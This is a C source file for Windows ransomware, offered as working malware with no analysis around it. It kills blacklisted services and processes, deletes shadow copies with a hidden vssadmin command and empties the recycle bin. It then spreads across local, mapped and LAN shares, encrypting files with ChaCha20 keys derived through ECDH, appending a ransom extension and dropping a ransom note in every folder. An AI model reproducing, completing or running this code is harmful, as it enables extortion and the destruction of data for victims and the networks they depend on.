#include <windows.h>
#include <shlwapi.h>
#include <process.h>
#include <tlhelp32.h>
#include <winnetwk.h>
#include <restartmanager.h>

#include "main.h"
#include "config.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	int LAN_MODE = 0;
	
	int argc = 0;
	LPSTR *argv = CommandLineToArgvA(GetCommandLineA(), &argc);
	if(argc < 1)
	{
		for(int i = 1; i < argc; ++i)
		{
			if(lstrcmpA(argv[1], "-lanfirst"))
			{
				if(lstrcmpA(argv[1], "-lansecond"))
				{
					if(!lstrcmpA(argv[1], "-nolan"))
					{
						LAN_MODE = -1; // no lan encryption
					}
				}
				else
				{
					LAN_MODE = 0;
				}
			}
			else
			{
				LAN_MODE = 1;
			}
		}
	}
	
#ifdef DEBUG
	switch(LAN_MODE)
	{
		case -1:
		{
			printf("[INF] -nolan specidifed! Not encrypting LAN!\r\n");
			break;
		}
		
		case 0:
		{
			printf("[INF] -lansecond specified! Encrypting LAN AFTER files!\r\n");
			break;
		}
		
		case 1:
		{
			printf("[INF] -lanfirst specified! Encrypting LAN FIRST and then files!\r\n");
			break;
		}
	}
#endif
	
	// Stop the machine from shutting down easily
	SetProcessShutdownParameters(0, 0);
	
	InitializeCriticalSection(&critSection);
	
	// Clear shadow copies, stop services, and end processes
	ServiceFucker();
	ProcessFucker();
	ShadowFucker();
	
	// Empty the recycle bin (fuck small chance of data recovery this way)
	SHEmptyRecycleBinW(NULL, NULL, 7);
	
	// Grab system information
	SYSTEM_INFO sysInfo;
	GetSystemInfo(&sysInfo);
	
	DWORD processorCount = sysInfo.dwNumberOfProcessors * 2;
	DWORD threadCount    = 0;
	
	HANDLE *hThreads = (HANDLE*)myHeapAlloc(sysInfo.dwNumberOfProcessors * 8);
	if(hThreads != NULL)
	{
		// ECDH setup
		ChaChaKey1Setup();
		ECDHPrivateKeySetup(VICTIM_ECDH_PRIVATE_KEY, ECC_PRV_KEY_SIZE);
		ecdh_generate_keys(VICTIM_ECDH_PUBLIC_KEY, VICTIM_ECDH_PRIVATE_KEY);
		ecdh_shared_secret(VICTIM_ECDH_PRIVATE_KEY, MY_ECDH_PUB_KEY, ECDH_SHARED_SECRET);
		
		// Setup the ChaCha20 Keys
		sha256(CHACHA20_FINAL_KEY_1, ECDH_SHARED_SECRET, ECC_PRV_KEY_SIZE);
		sha256(CHACHA20_FINAL_KEY_2, ECDH_SHARED_SECRET, ECC_PUB_KEY_SIZE);
		
		// Setup the ChaCha20 Nonce
		memcpy(CHACHA20_FINAL_NONCE, ECDH_SHARED_SECRET, sizeof(CHACHA20_FINAL_NONCE));
		
		WCHAR pubkeypath[MAX_PATH];
		GetEnvironmentVariableW(L"APPDATA", pubkeypath, MAX_PATH);
		lstrcatW(pubkeypath, L"\\ecdh_pub_k.bin");
		
#ifdef DEBUG
		if(PathFileExistsW(pubkeypath))
		{
			DeleteFileW(pubkeypath);
		}
#endif
		
		DWORD wb = 0;
		HANDLE hFile = CreateFileW(pubkeypath, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
		if(hFile != INVALID_HANDLE_VALUE)
		{
			WriteFile(hFile, VICTIM_ECDH_PUBLIC_KEY, ECC_PUB_KEY_SIZE, &wb, NULL);
			CloseHandle(hFile);
			
#ifdef DEBUG
			wprintf(L"[INF] Wrote pub key %ls\r\n", pubkeypath);
#endif
			
			if(LAN_MODE == 1)
			{
				SearchLAN(NULL);
			}
			
			MountVolumes();
			
			DWORD drivemask = GetLogicalDrives();
			if(drivemask)
			{
				for(char i = 'A'; i <= 'Z'; ++i)
				{
					if((drivemask & 1) != 0)
					{
						if(threadCount >= processorCount)
						{
							WaitForMultipleObjects(threadCount, hThreads, TRUE, INFINITE);
							for(int j = 0; j < threadCount; ++j)
							{
								CloseHandle(hThreads[j]);
							}
							threadCount = 0;
						}
						
						WCHAR *drivestring = (WCHAR*)myHeapAlloc(14);
						lstrcpyW(drivestring, L"\\\\?\\");
						lstrcpyW(drivestring + 5, L":");
						drivestring[4] = i;
						
						DWORD drivetype = GetDriveTypeW(drivestring);
						if(drivetype != DRIVE_UNKNOWN
						&& drivetype != DRIVE_CDROM)
						{				
							if(drivetype != DRIVE_REMOTE)
							{	
#ifdef DEBUG
								wprintf(L"[INF] Threading %ls\r\n", drivestring);
#endif
								hThreads[threadCount++] = CreateThread(NULL, 0, SearchFilesThreaded, drivestring, 0, NULL);
							}
							else
							{
								DWORD nLength = MAX_PATH;
								
								WCHAR *remotename = (WCHAR*)myHeapAlloc(MAX_PATH * 2);
								if(remotename != NULL
								&& !WNetGetConnectionW(drivestring + 4, remotename, &nLength))
								{
#ifdef DEBUG
									wprintf(L"[INF] Threading Remote %ls\r\n", drivestring);
#endif
									hThreads[threadCount++] = CreateThread(NULL, 0, SearchFilesThreaded, remotename, 0, NULL);
								}
							}
						}
						else
						{
							myHeapFree(drivestring);
						}
					}
					drivemask >>= 1;
				}
			}
			
			if(LAN_MODE == 0)
			{
				SearchLAN(NULL);
			}
			
			WaitForMultipleObjects(threadCount, hThreads, TRUE, INFINITE);
			for(int j = 0; j < threadCount; ++j)
			{
				CloseHandle(hThreads[j]);
			}
		}
#ifdef DEBUG
		else
		{
			wprintf(L"[INF] Bad handle on key path! Bailing!\r\n");
		}
#endif
		myHeapFree(hThreads);
	}
	ShadowFucker();
	ExitProcess(0);
}

//-- Core

// 
BOOLEAN ChaChaKey1Setup()
{
	HMODULE hModule = LoadLibraryA("advapi32.dll");
	pdef_RtlGenRandom RtlGenRandom_ = (pdef_RtlGenRandom)GetProcAddress(hModule, "SystemFunction036");
	return RtlGenRandom_(CHACHA20KEY_1, sizeof(CHACHA20KEY_1));
}

// 
VOID ECDHPrivateKeySetup(BYTE *input, int incount)
{
	ChaCha20XOR(CHACHA20KEY_1, 20, CHACHA20NONCE_1, CHACHA20KEY_1, CHACHA20KEY_1, 44);
	ChaCha20XOR(CHACHA20KEY_2, 20, CHACHA20NONCE_2, CHACHA20KEY_2, CHACHA20KEY_2, 44);
	
	for(int i = 0; i < incount; i++)
	{
		input[i] = CHACHA20KEY_1[i];
	}
}

//
VOID MountVolumes()
{
	WCHAR VolumePathNames[MAX_PATH];
	
	const WCHAR *drives[] =
	{
		L"Q:\\",
		L"W:\\",
		L"E:\\",
		L"R:\\",
		L"T:\\",
		L"Y:\\",
		L"U:\\",
		L"I:\\",
		L"O:\\",
		L"P:\\",
		L"A:\\",
		L"S:\\",
		L"D:\\",
		L"F:\\",
		L"G:\\",
		L"H:\\",
		L"J:\\",
		L"K:\\",
		L"L:\\",
		L"Z:\\",
		L"X:\\",
		L"C:\\",
		L"V:\\",
		L"B:\\",
		L"N:\\",
		L"M:\\"
	};
	
	LPCWSTR lpszVolumeMountPoint[26];
	
	int j = 0;
	for(int i = 0; i < ARRAY_SIZE(drives); ++i)
	{
		if(GetDriveTypeW(drives[i]) == DRIVE_NO_ROOT_DIR)
		{
			lpszVolumeMountPoint[j++] = drives[i];
		}
	}
	
	DWORD cchBufferLength = 120;
	DWORD cchReturnLength = 0;
	
	WCHAR *volumename = (WCHAR*)myHeapAlloc(65536);
	if(volumename != NULL)
	{
		LPVOID unused = (LPVOID)myHeapAlloc(65536);
		if(unused != NULL)
		{
			HANDLE hFindVolume = FindFirstVolumeW(volumename, 32768);
			do
			{
				if(!j)
				{
					break;
				}
				
				if(!GetVolumePathNamesForVolumeNameW(volumename, VolumePathNames, cchBufferLength, &cchReturnLength)
				||  lstrlenW(VolumePathNames) != 3)
				{
					SetVolumeMountPointW(lpszVolumeMountPoint[--j], volumename);
				}
			} while(FindNextVolumeW(hFindVolume, volumename, 32768));
			FindVolumeClose(hFindVolume);
			myHeapFree(unused);
		}
		myHeapFree(volumename);
	}
}

// Kills services
VOID ServiceFucker()
{
	DWORD dwStartTime = GetTickCount();
	DWORD dwTimeout   = 3000;
	
	LPENUM_SERVICE_STATUS lpServices = NULL;
	
	SC_HANDLE hSvcManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if(hSvcManager != NULL)
	{
		for(int i = 0; i < ARRAY_SIZE(BLACKLISTED_SERVICES); ++i)
		{
			SC_HANDLE hService = OpenServiceA(hSvcManager, BLACKLISTED_SERVICES[i], 0x2C);
			if(hService != NULL)
			{
				DWORD nb;
				SERVICE_STATUS svcStatus;
				
				if(QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&svcStatus, sizeof(SERVICE_STATUS), &nb)
				&& svcStatus.dwCurrentState != SERVICE_STOPPED
				&& svcStatus.dwCurrentState != SERVICE_STOP_PENDING)
				{
					DWORD dwCount, nb;
					if(!EnumDependentServicesA(hService, SERVICE_STOPPED, lpServices, 0, &nb, &dwCount)
					&&  GetLastError() == ERROR_MORE_DATA)
					{
						lpServices = (LPENUM_SERVICE_STATUSA)myHeapAlloc(nb);
						if(lpServices != NULL)
						{
							if(EnumDependentServicesA(hService, SERVICE_STOPPED, lpServices, nb, &nb, &dwCount))
							{
								ENUM_SERVICE_STATUS ess;
								ess = *(lpServices + i);
                				
								SC_HANDLE hService2 = OpenService(hService, ess.lpServiceName, SERVICE_STOP | SERVICE_QUERY_STATUS);
								if(hService2 != NULL)
								{
									SERVICE_STATUS ServiceStatus;
									
									if(ControlService(hService2, SERVICE_STOPPED, &ServiceStatus))
									{
										while(ServiceStatus.dwCurrentState != SERVICE_STOPPED)
										{
											Sleep(ServiceStatus.dwWaitHint);
											
											if(QueryServiceStatusEx(hService2, SC_STATUS_PROCESS_INFO, (LPBYTE)&ServiceStatus, sizeof(ServiceStatus), &nb))
											{
												if(ServiceStatus.dwCurrentState || GetTickCount() - dwStartTime > dwTimeout)
												{
													break;
												}
											}
										}
										CloseServiceHandle(hService2);
									}
								}
							}
							myHeapFree(lpServices);
						}
					}
					
					if(ControlService(hService, SERVICE_STOPPED, &svcStatus))
					{
						while(svcStatus.dwCurrentState != SERVICE_STOPPED
						&&    GetTickCount() - dwStartTime <= dwTimeout)
						{
							if(svcStatus.dwCurrentState == SERVICE_STOPPED)
							{
								break;
							}
							
							Sleep(svcStatus.dwWaitHint);
							
							if(!QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&svcStatus, sizeof(svcStatus), &nb))
							{
								break;
							}
						}
					}
				}
				CloseServiceHandle(hService);
			}
		}
		CloseServiceHandle(hSvcManager);
	}
}

// Enumerates through processes and kills them all
VOID ProcessFucker()
{
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
	
	PROCESSENTRY32W pEntry;
    pEntry.dwSize = sizeof(pEntry);
	
	for(BOOL i = Process32FirstW(hSnapShot, &pEntry); i == TRUE; i = Process32NextW(hSnapShot, &pEntry))
	{
		for(int j = 0; j < ARRAY_SIZE(BLACKLISTED_PROCESSES); ++j)
		{
			if(!lstrcmpW(BLACKLISTED_PROCESSES[j], pEntry.szExeFile))
			{
				HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pEntry.th32ProcessID);
				if(hProcess != NULL)
				{
					TerminateProcess(hProcess, 9);
					CloseHandle(hProcess);
				}
				break;
			}
		}
	}
	CloseHandle(hSnapShot);
}

// Deletes shadow copies
VOID ShadowFucker()
{
	PVOID oldValue = NULL;
	if(myIsWow64Process())
	{
		HMODULE hModule = LoadLibraryA("kernel32.dll");
		pdef_Wow64DisableWow64FsRedirection Wow64DisableWow64FsRedirection_ = (pdef_Wow64DisableWow64FsRedirection)GetProcAddress(hModule, "Wow64DisableWow64FsRedirection");
		
		if(Wow64DisableWow64FsRedirection_ != NULL)
		{
			Wow64DisableWow64FsRedirection_(&oldValue);
		}
	}
	
	ShellExecuteW(NULL, L"open", L"cmd.exe", L"/c vssadmin.exe delete shadows /all /quiet", 0, SW_HIDE);
	
	// why double check this?
	if(myIsWow64Process())
	{
		HMODULE hModule2 = LoadLibraryA("kernel32.dll");
		pdef_Wow64RevertWow64FsRedirection Wow64RevertWow64FsRedirection_ = (pdef_Wow64RevertWow64FsRedirection)GetProcAddress(hModule2, "Wow64RevertWow64FsRedirection");
		if(Wow64RevertWow64FsRedirection_ != NULL)
		{
			Wow64RevertWow64FsRedirection_(&oldValue);
		}
	}
}

// 
VOID SearchLAN(LPNETRESOURCEW resourcename)
{
	LPNETRESOURCEW foundresource;
	
	DWORD memsize = sizeof(LPNETRESOURCEW);
	DWORD rCount = -1;
	
	HANDLE hEnum;
	if(!WNetOpenEnumW(RESOURCE_GLOBALNET, RESOURCETYPE_ANY, RESOURCEUSAGE_ALL, resourcename, &hEnum))
	{
		foundresource = (LPNETRESOURCEW)myHeapAlloc(memsize);
		if(foundresource != NULL)
		{
			while(!WNetEnumResourceW(hEnum, &rCount, foundresource, &memsize))
			{
				for(int i = 0; i < rCount; ++i)
				{
					if((foundresource[i].dwUsage & 2) != 0)
					{
						SearchLAN(&foundresource[i]);
					}
					else
					{
						SearchFiles(foundresource[i].lpRemoteName, 0);
					}
				}
			}
			myHeapFree(foundresource);
		}
		WNetCloseEnum(hEnum);
	}
}

// Search files thread
DWORD WINAPI SearchFilesThreaded(LPVOID lpParam)
{
	SearchFiles((WCHAR*)lpParam, 0);
	myHeapFree(lpParam);
	return 0;
}

// Recursive folder enumeration
VOID SearchFiles(WCHAR *pathname, int layer)
{
	WIN32_FIND_DATAW fd;
	
	WCHAR *pathsearch = (WCHAR*)myHeapAlloc(65536);
	if(pathsearch != NULL)
	{
		lstrcpyW(pathsearch, pathname);
		lstrcatW(pathsearch, L"\\*");
		
		HANDLE hFind = FindFirstFileW(pathsearch, &fd);
		if(hFind != INVALID_HANDLE_VALUE)
		{
			BOOL isBlack = FALSE;
			do
			{
				for(int i = 0; i < ARRAY_SIZE(BLACKLISTED_FILENAMES); ++i)
				{
					if(!lstrcmpW(fd.cFileName, BLACKLISTED_FILENAMES[i]))
					{
#ifdef DEBUG
						wprintf(L"[INF] Blacklisted file %ls\r\n", fd.cFileName);
#endif
						isBlack = TRUE;
						break;
					}
				}
				
				if(!isBlack)
				{
					lstrcpyW(pathsearch, pathname);
					lstrcatW(pathsearch, L"\\");
					lstrcatW(pathsearch, fd.cFileName);
					
					if(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
					{
						if(layer < 16)
						{
#ifdef DEBUG
							wprintf(L"[INF] Walking %ls\r\n", pathsearch);
#endif
							SearchFiles(pathsearch, layer + 1);
						}
					}
					else if(lstrcmpW(fd.cFileName, RANSOM_NAME))
					{
						for(int j = lstrlenW(fd.cFileName); j > 0; --j)
						{
							if(fd.cFileName[j] == '.')
							{
								if(!lstrcmpW(&fd.cFileName[j], RANSOM_EXT))
								{
#ifdef DEBUG
									wprintf(L"[INF] Skipping file %ls\r\n", fd.cFileName);
#endif
									isBlack = TRUE;
									break;
								}
							}
						}
						
						if(!isBlack)
						{
#ifdef DEBUG
							wprintf(L"[INF] Encrypting file %ls\r\n", pathsearch);
#endif
							CryptFile(pathsearch);
						}
					}
				}
				isBlack = FALSE;
			} while(FindNextFileW(hFind, &fd));
			FindClose(hFind);
			
			lstrcpyW(pathsearch, pathname);
			lstrcatW(pathsearch, L"\\");
			lstrcatW(pathsearch, RANSOM_NAME);
			
			HANDLE hFile = CreateFileW(pathsearch, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, 0, NULL);
			if(hFile != INVALID_HANDLE_VALUE)
			{
#ifdef DEBUG
				wprintf(L"[INF] Writing note %ls\r\n", pathsearch);
#endif
				DWORD wb;
				WriteFile(hFile, RANSOM_NOTE, lstrlenA(RANSOM_NOTE), &wb, NULL);
				CloseHandle(hFile);
			}
		}
	}
	myHeapFree(pathsearch);
}


// File encryption function
VOID CryptFile(const WCHAR *filename)
{
	HANDLE hFile;
	
	WCHAR sessionKey[CCH_RM_SESSION_KEY + 1];
	DWORD sessionHnd;
	RM_PROCESS_INFO dwProcessId[10];
	
	DWORD rebootReasons;
	BOOL bWhat = TRUE;
	
	SetFileAttributesW(filename, FILE_ATTRIBUTE_NORMAL);
	while(TRUE)
	{
		hFile = CreateFileW(filename, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if(hFile != INVALID_HANDLE_VALUE)
		{
			break;
		}
		
		if(!bWhat)
		{
			break;
		}
		
		ZeroMemory(sessionKey, CCH_RM_SESSION_KEY + 1);
		
		if(RmStartSession(&sessionHnd, 0, sessionKey))
		{
			break;
		}
		
		if(!RmRegisterResources(sessionHnd, 1, &filename, 0, NULL, 0, NULL))
		{
			UINT procInfoNeeded, procInfo = sizeof(dwProcessId);
			if(!RmGetList(sessionHnd, &procInfoNeeded, &procInfo, dwProcessId, &rebootReasons))
			{
				for(int i = 0; i < procInfo; ++i)
				{
					if(dwProcessId[i].ApplicationType != RmExplorer
					&& dwProcessId[i].ApplicationType != RmCritical
					&& GetCurrentProcessId() != dwProcessId[i].Process.dwProcessId)
					{
						HANDLE hProcess = OpenProcess(PROCESS_SET_QUOTA | PROCESS_TERMINATE, FALSE, dwProcessId[i].Process.dwProcessId);
						if(hProcess != INVALID_HANDLE_VALUE)
						{
							TerminateProcess(hProcess, 0);
							WaitForSingleObject(hProcess, 5000);
							CloseHandle(hProcess);
						}
					}
				}
			}
		}
		RmEndSession(sessionHnd);
		bWhat = FALSE;
	}
	
	LARGE_INTEGER FileSize;
	GetFileSizeEx(hFile, &FileSize);
	
	HANDLE hMAP = CreateFileMappingA(hFile, NULL, PAGE_READWRITE, 0, 0, NULL);
	if(hMAP != NULL)
	{
		if(FileSize.QuadPart <= 41943040)
		{
			if(FileSize.QuadPart > 0)
			{
				LPBYTE hView = (LPBYTE)MapViewOfFile(hMAP, FILE_MAP_ALL_ACCESS, 0, 0, FileSize.LowPart);
				if(hView != NULL)
				{
					ChaCha20XOR(CHACHA20_FINAL_KEY_1, 20, CHACHA20_FINAL_NONCE, hView, hView, FileSize.LowPart);
					ChaCha20XOR(CHACHA20_FINAL_KEY_2, 20, CHACHA20_FINAL_NONCE, hView, hView, FileSize.LowPart);
					UnmapViewOfFile(hView);
				}
			}
		}
		else
		{
			DWORD blocks = FileSize.QuadPart / 10485760 / 3;
			for(int i = 0; i < 3; ++i)
			{
				DWORD offsetHigh = blocks * i;
				DWORD offsetLow  = offsetHigh * 10485760;
				
				LPBYTE hView = (LPBYTE)MapViewOfFile(hMAP, FILE_MAP_ALL_ACCESS, offsetHigh, offsetLow, 10485760);
				if(hView != NULL)
				{
					ChaCha20XOR(CHACHA20_FINAL_KEY_1, 20, CHACHA20_FINAL_NONCE, hView, hView, 10485760);
					ChaCha20XOR(CHACHA20_FINAL_KEY_2, 20, CHACHA20_FINAL_NONCE, hView, hView, 10485760);
					UnmapViewOfFile(hView);
				}
			}
		}
		CloseHandle(hMAP);
	}
	FlushFileBuffers(hFile);
	CloseHandle(hFile);
	
	WCHAR *newPath = (WCHAR*)myHeapAlloc(65536);
	if(newPath != NULL)
	{
		lstrcpyW(newPath, filename);
		lstrcatW(newPath, RANSOM_EXT);
		MoveFileExW(filename, newPath, 9);
		myHeapFree(newPath);
	}
}

//-- Utils

// Checks if the process is running on a 64 bit machine
BOOL myIsWow64Process()
{
	BOOL bIsWow = 0;
	
	HMODULE hModule = GetModuleHandleA("kernel32.dll");
	pdef_IsWow64Process IsWow64Process_ = (pdef_IsWow64Process)GetProcAddress(hModule, "IsWow64Process");
	if(IsWow64Process_ != NULL)
	{
		if(!IsWow64Process_(GetCurrentProcess(), &bIsWow))
		{
			bIsWow = FALSE;
		}
	}
	return bIsWow;
}

// Paser for GetCommandLineA()
PCHAR *CommandLineToArgvA(PCHAR CmdLine, int *_argc)
{
	PCHAR *argv;
	PCHAR _argv;
	ULONG len;
	ULONG argc;
	CHAR a;
	ULONG i, j;

	BOOLEAN in_QM;
	BOOLEAN in_TEXT;
	BOOLEAN in_SPACE;

	len = strlen(CmdLine);
	i   = ((len + 2) / 2) * sizeof(PVOID) + sizeof(PVOID);

	argv  = (PCHAR *)LocalAlloc(LMEM_FIXED, i + (len + 2) * sizeof(CHAR));

	_argv = (PCHAR)(((PUCHAR)argv) + i);

	argc  = 0;
	argv[argc] = _argv;
	in_QM = FALSE;
	in_TEXT  = FALSE;
	in_SPACE = TRUE;
	i = 0;
	j = 0;

	while(a = CmdLine[i])
	{
    	if(in_QM)
		{
      		if (a == '\"')
			{
        		in_QM = FALSE;
      		}
			else
			{
        		_argv[j] = a;
        		j++;
      		}
    	}
		else
		{
			switch(a)
			{
				case '\"':
				{
        			in_QM   = TRUE;
        			in_TEXT = TRUE;
        			
					if(in_SPACE)
					{
        				argv[argc] = _argv + j;
        				argc++;
        			}
        			
					in_SPACE = FALSE;
					break;
				}
				
				case ' ':
				case '\t':
				case '\n':
				case '\r':
				{
        			if(in_TEXT)
					{
        				_argv[j] = '\0';
        				j++;
        			}
        			
					in_TEXT  = FALSE;
        			in_SPACE = TRUE;
        			break;
        		}
				
				default:
				{
					in_TEXT  = TRUE;
					if(in_SPACE)
					{
        				argv[argc] = _argv + j;
        				argc++;
        			}
        			_argv[j] = a;
        			
					j++;
        			
					in_SPACE = FALSE;
        			break;
        		}
      		}
		}
		i++;
	}
	_argv[j] = '\0';
	argv[argc] = NULL;
	
	
	(*_argc) = argc;
	return argv;
}

// HeapAlloc wrapepr
LPVOID myHeapAlloc(int len)
{
	EnterCriticalSection(&critSection);
	LPVOID lpMem = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, len + 64);
	LeaveCriticalSection(&critSection);
	return lpMem;
}

// HeapFree wrapper
VOID myHeapFree(LPVOID mem)
{
	EnterCriticalSection(&critSection);
	HeapFree(GetProcessHeap(), 0, mem);
	LeaveCriticalSection(&critSection);
}